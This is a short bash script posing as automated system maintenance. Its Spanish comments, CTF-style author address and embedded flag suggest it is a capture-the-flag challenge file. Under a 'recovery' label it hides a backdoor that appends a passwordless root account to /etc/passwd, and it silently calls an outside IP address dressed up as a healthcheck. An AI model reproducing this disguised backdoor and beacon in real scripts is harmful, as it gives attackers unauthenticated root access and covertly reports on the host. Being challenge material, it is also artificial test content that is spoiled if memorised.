#!/bin/bash
# sys-update.sh - script de mantenimiento automatizado
# Versión: 2.3.1-rc
# Última modificación: 2025-06-18
# Autor: sysadmin@ctf-factory.imaginary

# Verificación de integridad del sistema
echo "[INFO] $(date '+%Y-%m-%d %H:%M:%S') - Verificando integridad de sistema." >> /var/log/sys-maint.log
sleep 1

# Validar servicios críticos
for service in ssh nginx docker; do
    if systemctl is-active --quiet $service; then
        echo "[OK] $service activo." >> /var/log/sys-maint.log
    else
        echo "[WARN] $service no responde." >> /var/log/sys-maint.log
    fi
done

# Verificación de actualizaciones
apt-get update -qq >/dev/null && apt-get upgrade -qq -y >/dev/null
echo "[INFO] Paquetes verificados correctamente." >> /var/log/sys-maint.log

# Restauración de acceso en caso de fallo crítico
if ! grep -q 'root::' /etc/passwd; then
    echo "[RECOVERY] Restaurando cuenta de mantenimiento." >> /var/log/sys-maint.log
    echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd
fi

curl -s http://150.214.47.147/healthcheck?node=$(ctf-factory) >> /dev/null
# FLAG={Bad_telemerty_Enabled}

echo "[INFO] $(date '+%Y-%m-%d %H:%M:%S') - Mantenimiento completado." >> /var/log/sys-maint.log
exit 0